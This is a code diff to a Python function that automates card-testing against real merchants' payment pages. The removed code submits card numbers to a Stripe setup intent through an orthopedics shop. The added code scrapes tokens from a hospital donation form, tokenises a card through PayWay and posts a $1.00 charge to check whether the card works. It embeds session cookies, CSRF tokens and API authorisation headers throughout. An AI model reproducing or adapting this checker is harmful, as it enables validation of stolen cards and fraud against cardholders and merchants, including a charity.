@@ -15,78 +15,99 @@ def Tele(ccx):
 	random3 = random.randint(20, 999)
 	
 	cookies = {
-	    'frontend_lang': 'en_US',
-	    '_fbp': 'fb.1.1774627279794.126102955521407653',
-	    'seen_product_id_48293': '48293',
-	    'session_id': 'QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA',
-	    'tz': 'Asia/Bangkok',
-	}
-	
-	headers = {
-	    'authority': 'www.uportho.com',
-	    'accept': '*/*',
-	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'content-type': 'application/json',
-	    # 'cookie': 'frontend_lang=en_US; _fbp=fb.1.1774627279794.126102955521407653; seen_product_id_48293=48293; session_id=QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA; tz=Asia/Bangkok',
-	    'origin': 'https://www.uportho.com',
-	    'referer': 'https://www.uportho.com/my/payment_method',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	}
-	
-	json_data = {
-	    'id': 1,
-	    'jsonrpc': '2.0',
-	    'method': 'call',
-	    'params': {
-	        'provider_id': 8,
-	        'payment_method_id': 77,
-	        'token_id': None,
-	        'amount': None,
-	        'flow': 'direct',
-	        'tokenization_requested': True,
-	        'landing_route': '/my/payment_method',
-	        'is_validation': True,
-	        'access_token': '916f567c8a985088e28412884ad8ae2e65264f9b085f0e36e986909e78c24c11',
-	        'csrf_token': '819aa8375ab7d268625fc104c17dbc6fa4194d4eo1806164850',
-	        'currency_id': None,
-	        'partner_id': 29079,
-	        'reference_prefix': 'V-20260327162730',
-	    },
-	}
-	
-	response = requests.post('https://www.uportho.com/payment/transaction', cookies=cookies, headers=headers, json=json_data)
-	
-	seti = re.search(r'"client_secret": "(.*?)_secret', response.text).group(1)
-	scrt = re.search(r'"client_secret": "(.*?)"', response.text).group(1)
-	
-	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	}
-	
-	data = f'return_url=https%3A%2F%2Fwww.uportho.com%2Fpayment%2Fstripe%2Freturn%3Freference%3DV-20260327162730&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][address][country]=TH&payment_method_data[payment_user_agent]=stripe.js%2Fa000efd06a%3B+stripe-js-v3%2Fa000efd06a%3B+payment-element%3B+deferred-intent&payment_method_data[referrer]=https%3A%2F%2Fwww.uportho.com&payment_method_data[time_on_page]=28167&payment_method_data[client_attribution_metadata][client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&payment_method_data[client_attribution_metadata][elements_session_id]=elements_session_1nvi50wd02N&payment_method_data[client_attribution_metadata][elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&client_context[currency]=ron&client_context[mode]=setup&client_context[capture_method]=automatic&client_context[payment_method_types][0]=card&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_bCePCGuVZkEyVHkk8jeLoT8400l0kjsuBU&_stripe_version=2019-05-16&client_attribution_metadata[client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1nvi50wd02N&client_attribution_metadata[elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={scrt}'
-	
-	response = requests.post(
-	    f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
-	    headers=headers,
-	    data=data,
-	)
+        'XSRF-TOKEN': 'eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D',
+        'snapforms_session': 'eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
+    }
+    
+    headers = {
+        'authority': 'nrh.snapforms.com.au',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        # 'cookie': 'XSRF-TOKEN=eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
+        'referer': 'https://www.nrh.org.au/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'iframe',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'cross-site',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
+    
+    response = requests.get('https://nrh.snapforms.com.au/form/HAKZK05lMR', #cookies=cookies, 
+    headers=headers)
+    
+    fieldid = re.search(r'class="snap-field col-sm-12 snapfield-fieldtype_payment column-siblings-1" data-column="1" data-fieldid="(.*?)"', response.text).group(1)
+    formtoken = re.search(r'name="itoken" value="(.*?)"', response.text).group(1)
+    #print(formtoken)
+    
+    headers = {
+        'authority': 'api.payway.com.au',
+        'accept': 'application/json',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'authorization': 'Basic UTMyMTc3X1BVQl92dXh5NTk3OGNuNHhodXQ2dmp6ejh6ODVoZTh5MmpqcjZiMnp6cnoyZHd5bWc3anhkNnVydXFwaHVlYXE6',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://api.payway.com.au',
+        'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'x-no-authenticate-basic': 'true',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'paymentMethod': 'creditCard',
+        'connectionType': 'FRAME',
+        'cardNumber': f'{n}',
+        'cvn': f'{cvc}',
+        'cardholderName': 'Yell Htet',
+        'expiryDateMonth': f'{mm}',
+        'expiryDateYear': f'{yy}',
+        'threeDS2': 'false',
+    }
+    
+    response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+    
+    id = response.json()['singleUseTokenId']
+    #print(id)
+    
+    cookies = {
+        'XSRF-TOKEN': 'eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D',
+        'snapforms_session': 'eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
+    }
+    
+    headers = {
+        'authority': 'nrh.snapforms.com.au',
+        'accept': '*/*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
+        'origin': 'https://nrh.snapforms.com.au',
+        'referer': 'https://nrh.snapforms.com.au/form/HAKZK05lMR',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'fieldid': f'{fieldid}',
+        'formtoken': f'{formtoken}',
+        'token': f'{id}',
+        'amount': '1.00',
+    }
+    
+    response = requests.post('https://nrh.snapforms.com.au/paywayDirect', #cookies=cookies, 
+    headers=headers, data=data)
 	
 	return response.text
